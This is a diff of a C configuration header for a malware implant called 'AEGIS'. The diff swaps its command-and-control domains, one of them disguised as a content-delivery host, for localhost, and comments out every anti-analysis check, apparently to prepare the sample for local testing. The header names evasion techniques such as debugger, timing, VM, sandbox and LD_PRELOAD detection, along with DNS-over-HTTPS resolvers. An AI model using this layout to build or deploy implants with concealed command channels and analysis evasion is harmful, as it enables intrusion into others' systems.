@@ -19,10 +19,10 @@
 
 /* ── C2 Configuration ────────────────────────────────────────────────────── */
 
-#define AEGIS_C2_PRIMARY_HOST "cheta4.darkdiamondfront.shop"
-#define AEGIS_C2_PRIMARY_PORT 443
-#define AEGIS_C2_FALLBACK_HOST "static.content-delivery-net.com"
-#define AEGIS_C2_FALLBACK_PORT 443
+#define AEGIS_C2_PRIMARY_HOST "127.0.0.1"
+#define AEGIS_C2_PRIMARY_PORT 8443
+#define AEGIS_C2_FALLBACK_HOST "127.0.0.1"
+#define AEGIS_C2_FALLBACK_PORT 8443
 #define AEGIS_C2_DOH_RESOLVER "https://dns.cloudflare.com/dns-query"
 #define AEGIS_C2_DOH_FALLBACK "https://dns.google/dns-query"
 #define AEGIS_C2_USER_AGENT                                                    \
@@ -73,18 +73,19 @@
 
 /* ── Anti-Analysis Thresholds ────────────────────────────────────────────── */
 
-/* Granular Control Flags (Comment out to disable individual checks) */#define AEGIS_AA_ENABLE_PTRACE
-#define AEGIS_AA_ENABLE_TRACER_PID
-#define AEGIS_AA_ENABLE_RDTSC
-#define AEGIS_AA_ENABLE_SLEEP_TIMING
-#define AEGIS_AA_ENABLE_HOSTILE_PROCS
-#define AEGIS_AA_ENABLE_VM_CPUID
-#define AEGIS_AA_ENABLE_VM_MAC
-#define AEGIS_AA_ENABLE_SANDBOX_RESOURCES
-#define AEGIS_AA_ENABLE_CONTAINER
-#define AEGIS_AA_ENABLE_BREAKPOINTS
-#define AEGIS_AA_ENABLE_UPTIME
-#define AEGIS_AA_ENABLE_LD_PRELOAD
+/* Granular Control Flags (Comment out to disable individual checks) */
+//#define AEGIS_AA_ENABLE_PTRACE
+//#define AEGIS_AA_ENABLE_TRACER_PID
+//#define AEGIS_AA_ENABLE_RDTSC
+//#define AEGIS_AA_ENABLE_SLEEP_TIMING
+//#define AEGIS_AA_ENABLE_HOSTILE_PROCS
+//#define AEGIS_AA_ENABLE_VM_CPUID
+//#define AEGIS_AA_ENABLE_VM_MAC
+//#define AEGIS_AA_ENABLE_SANDBOX_RESOURCES
+//#define AEGIS_AA_ENABLE_CONTAINER
+//#define AEGIS_AA_ENABLE_BREAKPOINTS
+//#define AEGIS_AA_ENABLE_UPTIME
+//#define AEGIS_AA_ENABLE_LD_PRELOAD
 
 #define AEGIS_AA_RDTSC_THRESHOLD 1000000 /* CPU cycles — timing gap  */
 #define AEGIS_AA_SLEEP_CHECK_MS 100      /* Sleep duration for check */
